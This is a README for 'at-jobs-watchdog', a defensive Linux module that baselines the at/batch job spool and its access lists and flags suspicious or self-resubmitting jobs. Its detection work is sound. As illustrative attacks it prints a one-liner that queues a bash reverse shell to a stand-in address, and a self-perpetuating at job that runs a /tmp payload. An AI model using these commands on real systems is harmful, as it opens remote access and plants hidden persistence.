# at-jobs-watchdog

Boot + daily delta of the `at`/`batch` job spool + access lists
against a learned baseline, plus a suspicious-pattern +
self-resubmission scan. Catches a one-shot scheduler-persistence
job that cron-job-watchdog does not see. MITRE **T1053.001**
(Scheduled Task/Job: At).

## Why this matters

`atd` runs each spooled job **as its owner** at the scheduled
time. `at` is the one-shot scheduler sibling of cron, and
`cron-job-watchdog` does not look at it. The high-signal cases:

```
echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' | at now + 1 minute
# self-perpetuating loop (survives its own execution):
echo '/tmp/.p; echo "/tmp/.p" | at now + 1 hour' | at now + 1 hour
```

A job that **re-submits itself** via `at`/`batch` is a
persistence loop that outlives any single run; a job body with a
reverse shell or a tmp payload is a queued backdoor.

## Watched

- `/var/spool/cron/atjobs` (Debian/Ubuntu)
- `/var/spool/at`, `/var/spool/at/spool`, `/var/spool/atjobs`
  (RHEL/other)
- `/etc/at.allow`, `/etc/at.deny` (who may use `at`)

No-ops cleanly if no spool/ACL exists (`event:no_at_spool`).

## Profiles

| Profile | Effect |
|---|---|
| `report` (default) | log delta; exit 0 |
| `enforce` | exit 1 on any at-spool change → systemd unit failed → notifier engine |

## Severity ladder

| Condition | Severity | Event |
|---|---|---|
| First scan | `ok` | `baseline_initial` |
| No at spool present | `ok` | `no_at_spool` |
| No delta | `ok` | `at_jobs_intact` |
| A job / acl added, removed, or changed | `warn` | `at_jobs_changed` |
| A job body with a suspicious pattern OR a self-resubmitting `at`/`batch` call | `alert` | `at_jobs_suspicious` |

## What's recorded

- `job:<path>:<sha12>` — hash of each spooled job (atd
  bookkeeping like `.SEQ` / `.lockfile` skipped).
- `own:<path>:<owner>` — the submitting user (the job runs as
  this user).
- `susp:<path>:<pattern>` — a suspicious exec pattern or a
  self-resubmitting `at`/`batch` invocation.
- `acl:<file>:<sha12>` — hash of `at.allow` / `at.deny`.

## Cadence

`OnBootSec=20min` + `OnCalendar=*-*-* 07:45:00` — extends the
staggered ladder after grub-config (07:40). An `at` job persists
across reboot and fires at its scheduled time, so the boot catch
confirms the spool after a restart.

## MITRE coverage

- **T1053.001** Scheduled Task/Job: At — PRIMARY; `at` is the
  one-shot scheduler this covers.
- **T1059.004** Command and Scripting Interpreter: Unix Shell —
  the job body is shell execution.
- **T1546** Event Triggered Execution (adjacent) — a
  self-resubmitting job is an event loop.

## Operator workflow

```bash
journalctl -t selfdef-at-jobs -n 1 --no-pager
journalctl -t selfdef-at-jobs-detail --since "1 day ago"

# Inventory queued jobs
atq                        # summary (job id, time, owner)
for j in $(atq | awk '{print $1}'); do echo "== job $j =="; at -c "$j"; done

# Investigate a suspicious alert, then remove + re-baseline:
atrm <jobid>
sudo rm /var/lib/selfdef/at-jobs-baseline.tsv
sudo systemctl start selfdef-at-jobs.service

# If `at` is not used on this host, prefer at-disable (mask atd)
# — this watchdog then no-ops (no_at_spool).
```

## Caveats

- **`at` jobs are transient** (created, run once, deleted), so
  legit usage produces `warn` churn (re-baseline). The
  `suspicious` tier (reverse shell / tmp payload / self-resubmit)
  is the high-confidence one and is delta-independent.
- **If atd is masked** (via the `at-disable` module), no spool is
  created and this no-ops — the two modules pair: at-disable
  prevents, at-jobs-watchdog detects on hosts where `at` is in
  use.
- **Daily+boot cadence** misses a submit-run-delete within the
  window; an audit-rules watch on the spool dir's writes is the
  real-time complement.

## Coexistence

- **cron-job-watchdog**: the matched scheduler sibling — cron
  (recurring) vs at (one-shot). Together they cover both
  scheduler-persistence surfaces.
- **at-disable**: prevention (masks atd); this is detection for
  hosts that use `at`. Prevention + detection pair.
- **crontab-allow-watchdog**: cron.allow/cron.deny; this watches
  at.allow/at.deny — the parallel scheduler access lists.
- **aide-bridge / integrity-sentinel**: byte-level integrity on
  the spool; this adds the job-body + self-resubmit semantic
  view.
